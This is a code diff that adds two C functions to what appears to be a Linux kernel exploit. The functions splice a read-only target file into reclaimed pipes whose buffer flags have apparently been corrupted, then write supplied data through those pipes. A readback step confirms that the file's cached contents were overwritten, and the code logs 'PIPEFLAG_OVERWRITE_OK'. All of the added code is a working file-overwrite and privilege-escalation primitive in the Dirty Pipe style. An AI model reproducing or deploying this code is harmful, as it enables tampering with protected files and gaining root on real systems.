@@ -393,6 +393,96 @@ void reset_pipe_attempt(void) {
   atomic_store(&pipe_prepare_done, 0);
 }
 
+#if defined(PIPE_FLAG_OBJECT_INDEX) && defined(PIPE_BUFFER_FLAGS_OFF)
+int prepare_pipe_flag_target(const char *path) {
+  if (!pipe_objects_ready || !is_direct_ptr(pipebuf_page_base)) {
+    pr_error("pipe flag target missing pipe page base=%016zx ready=%d\n",
+             pipebuf_page_base, pipe_objects_ready);
+    return 0;
+  }
+
+  int target_fd = open(path, O_RDONLY | O_CLOEXEC);
+  if (target_fd < 0) {
+    pr_error("pipe flag target open path=%s errno=%d\n", path, errno);
+    return 0;
+  }
+
+  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
+    off64_t offset = 0;
+    errno = 0;
+    ssize_t moved = splice(target_fd, &offset,
+                           pipe_fds_reclaim[pipe_index][1], NULL, 1, 0);
+    if (moved != 1) {
+      int saved_errno = errno;
+      close(target_fd);
+      pr_error("pipe flag splice pipe=%zu moved=%zd errno=%d\n",
+               pipe_index, moved, saved_errno);
+      return 0;
+    }
+  }
+
+  close(target_fd);
+  pr_info("pipe flag target prepared path=%s pipes=%d page=%016zx "
+          "object=%d flags=%016zx\n",
+          path, PIPE_RECLAIM, pipebuf_page_base, PIPE_FLAG_OBJECT_INDEX,
+          pipebuf_page_base + PIPE_FLAG_OBJECT_INDEX * PIPE_OBJECT_SIZE +
+              PIPE_BUFFER_FLAGS_OFF);
+  return 1;
+}
+
+int run_pipe_flag_overwrite(const char *path, const void *data, size_t size) {
+  if (!size || size > PAGE_SIZE - 1) {
+    pr_error("pipe flag overwrite invalid size=%zu\n", size);
+    return 0;
+  }
+
+  int write_hits = 0;
+  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
+    errno = 0;
+    ssize_t wrote = write(pipe_fds_reclaim[pipe_index][1], data, size);
+    if (wrote == (ssize_t)size) {
+      write_hits++;
+    } else {
+      pr_warning("pipe flag write pipe=%zu wrote=%zd want=%zu errno=%d\n",
+                 pipe_index, wrote, size, errno);
+    }
+  }
+
+  int target_fd = open(path, O_RDONLY | O_CLOEXEC);
+  if (target_fd < 0) {
+    pr_error("pipe flag readback open path=%s errno=%d\n", path, errno);
+    return 0;
+  }
+  if (lseek(target_fd, 1, SEEK_SET) != 1) {
+    int saved_errno = errno;
+    close(target_fd);
+    pr_error("pipe flag readback seek path=%s errno=%d\n",
+             path, saved_errno);
+    return 0;
+  }
+
+  unsigned char *readback = malloc(size);
+  if (!readback) {
+    close(target_fd);
+    pr_error("pipe flag readback alloc size=%zu errno=%d\n", size, errno);
+    return 0;
+  }
+  ssize_t got = read(target_fd, readback, size);
+  int saved_errno = errno;
+  close(target_fd);
+  int matched = got == (ssize_t)size && memcmp(readback, data, size) == 0;
+  free(readback);
+
+  pr_info("pipe flag readback path=%s writes=%d/%d got=%zd want=%zu "
+          "match=%d errno=%d\n",
+          path, write_hits, PIPE_RECLAIM, got, size, matched, saved_errno);
+  if (matched) {
+    pr_success("PIPEFLAG_OVERWRITE_OK path=%s size=%zu\n", path, size);
+  }
+  return matched;
+}
+#endif
+
 uintptr_t direct_to_page(uintptr_t addr) {
   uintptr_t pfn = (addr - DIRECT_MAP_BASE) >> PAGE_SHIFT;
   return VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
